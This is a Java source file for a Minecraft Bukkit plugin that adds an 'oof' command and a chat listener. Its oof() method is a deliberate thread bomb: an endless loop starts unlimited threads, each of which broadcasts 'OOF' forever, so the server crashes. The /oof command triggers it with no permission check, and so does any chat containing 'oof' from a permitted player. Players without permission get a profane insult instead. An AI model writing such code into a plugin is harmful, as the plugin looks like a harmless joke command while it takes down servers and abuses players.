package me.reclines.oof;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class oofCommand implements CommandExecutor, Listener {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        oof();
        return true;
    }

    @EventHandler
    public boolean onPlayerChat(AsyncPlayerChatEvent e) {
        final Player sender = e.getPlayer();
        if (e.getMessage().contains("oof")) {
            if (sender.isOp() || sender.hasPermission("oof.oof")) {
                oof();
                return true;
            } else {
                //noinspection CodeBlock2Expr
                Bukkit.getScheduler().scheduleSyncDelayedTask(Main.instance, () -> {
                    sender.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "" + "Fuck off you stupid cunt");
                }, 2L);
            }
        }
        return true;
    }

    private void oof() {
        //noinspection InfiniteLoopStatement
        while (true)
            (new Thread(() -> {
                while (true)
                    Bukkit.broadcastMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "OOF");

            })).start();
    }
}
